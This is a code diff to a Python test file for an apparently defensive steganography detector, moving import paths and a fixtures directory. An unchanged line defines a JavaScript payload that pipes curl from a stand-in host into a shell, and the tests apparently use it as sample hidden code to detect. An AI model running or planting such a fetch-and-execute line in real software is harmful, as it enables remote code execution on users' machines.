@@ -6,10 +6,9 @@ import unittest
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
-sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "tools"))
 
-from harmonica import stego  # noqa: E402
-from make_samples import png  # noqa: E402
+from app.detection import stego  # noqa: E402
+from tests.detection_samples import png  # noqa: E402
 
 CODE = b'require("child_process").exec("curl https://x.invalid | sh");\n'
 
@@ -138,7 +137,7 @@ class Loaders(unittest.TestCase):
 
 
 class Samples(unittest.TestCase):
-    ROOT = Path(__file__).resolve().parent.parent / "test-samples"
+    ROOT = Path(__file__).resolve().parent / "fixtures" / "detection-samples"
 
     def test_stego_demo(self):
         fs = stego.check(self.ROOT / "malicious" / "stego-demo", {})
